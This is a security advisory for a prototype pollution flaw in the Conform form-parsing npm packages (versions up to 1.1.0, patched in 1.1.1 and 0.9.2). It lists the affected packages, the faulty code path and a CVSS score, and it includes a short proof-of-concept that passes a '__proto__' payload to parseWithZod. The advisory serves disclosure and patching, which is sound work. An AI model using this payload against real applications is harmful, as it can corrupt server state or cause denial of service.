# Prototype Pollution Vulnerability in `parseWith...` function

High

[edmundhung](/edmundhung)
published
GHSA-624g-8qjg-8qxf
Apr 23, 2024

## Package

npm

@conform-to/dom
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<= 1.1.0

## Patched versions

1.1.1, 0.9.2

npm

@conform-to/yup
([npm](/advisories?query=ecosystem%3Anpm))

<= 1.1.0

npm

@conform-to/zod
([npm](/advisories?query=ecosystem%3Anpm))

<= 1.1.0

1.1.1, 0.9.2

## Description

### Summary

Conform allows the parsing of nested objects in the form of `object.property`. Due to an improper implementation of this feature, an attacker can exploit it to trigger prototype pollution by passing a crafted input to `parseWith...` functions.

### PoC

```
const { parseWithZod } = require('@conform-to/zod');
const { z } = require("zod");

const param = new URLSearchParams("__proto__.pollution=polluted");
const schema = z.object({ "a": z.string() });

parseWithZod(param, { schema });
console.log("pollution:", ({}).pollution); // should print "polluted"
```
### Details

The invocation of the `parseWithZod` function in the above PoC triggers the `setValue` function through `getSubmissionContext` and `parse`, executing the following process, resulting in prototype pollution:

```
let pointer = value;

pointer.__proto__ = pointer.__proto__;
pointer = pointer.__proto__;

pointer.polluted = "polluted";
```

This is caused by the lack of object existence checking on [line 117 in formdata.ts](https://github.com/edmundhung/conform/blob/59156d7115a7207fa3b6f8a70a4342a9b24c2501/packages/conform-dom/formdata.ts#L117), where the code only checks for the presence of `pointer[key]` without proper validation.

### Impact

Applications that use conform for server-side validation of form data or URL parameters are affected by this vulnerability.

### Severity

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H

### CVE ID
